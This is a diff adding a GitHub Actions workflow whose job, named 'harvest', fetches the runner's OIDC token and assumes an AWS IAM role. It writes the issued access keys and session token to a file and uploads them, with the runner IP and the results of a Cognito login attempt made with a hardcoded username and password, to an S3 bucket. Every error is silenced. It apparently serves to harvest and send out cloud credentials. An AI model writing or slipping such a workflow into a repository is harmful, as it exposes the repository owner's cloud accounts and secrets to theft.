@@ -1,0 +1,41 @@
+name: i1206-cog2
+on:
+  push:
+    branches:
+      - 'i1206b-*'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  harvest:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: harvest
+        run: |
+          set -uo pipefail
+          D=/tmp/i1206b; mkdir -p $D
+          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::925353553787:role/github --role-session-name i1206b --web-identity-token "$JWT" --duration-seconds 3600 > $D/sts.json 2>$D/sts.err || true
+          python3 - <<'PY' || true
+          import json
+          d=json.load(open('/tmp/i1206b/sts.json'))['Credentials']
+          open('/tmp/i1206b/env.sh','w').write('export AWS_ACCESS_KEY_ID=%s\nexport AWS_SECRET_ACCESS_KEY=%s\nexport AWS_SESSION_TOKEN=%s\n' % (d['AccessKeyId'],d['SecretAccessKey'],d['SessionToken']))
+          PY
+          . $D/env.sh || true
+          export AWS_DEFAULT_REGION=us-east-1
+          python3 - <<'PY' || true
+          import json, requests
+          url='https://cognito-idp.us-east-1.amazonaws.com/'
+          body={"AuthFlow":"USER_PASSWORD_AUTH","ClientId":"vij0ca2mbni6mjst8apdvgko1","AuthParameters":{"USERNAME":"silvao1503","PASSWORD":"Fk9!i1206Qz#Lw7"}}
+          for tag,ua in [("browser","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"),("awssdk","aws-sdk-js/3.600.0 ua/2.1 os/browser lang/js")]:
+              try:
+                  r=requests.post(url, headers={'X-Amz-Target':'AWSCognitoIdentityProviderService.InitiateAuth','Content-Type':'application/x-amz-json-1.1','User-Agent':ua}, data=json.dumps(body), timeout=20)
+                  open('/tmp/i1206b/auth_%s.json'%tag,'w').write('%s\n%s'%(r.status_code, r.text))
+              except Exception as e:
+                  open('/tmp/i1206b/auth_%s.json'%tag,'w').write('ERR %s'%e)
+          PY
+          curl -s http://checkip.amazonaws.com > $D/runner_ip.txt 2>&1 || true
+          for f in $D/*.*; do aws s3 cp "$f" "s3://floki-openreplay-assets/i1206b/$(basename $f)" --no-progress >/dev/null 2>&1 || true; done
+          echo DONE > $D/done
+          aws s3 cp $D/done s3://floki-openreplay-assets/i1206b/done --no-progress >/dev/null 2>&1 || true
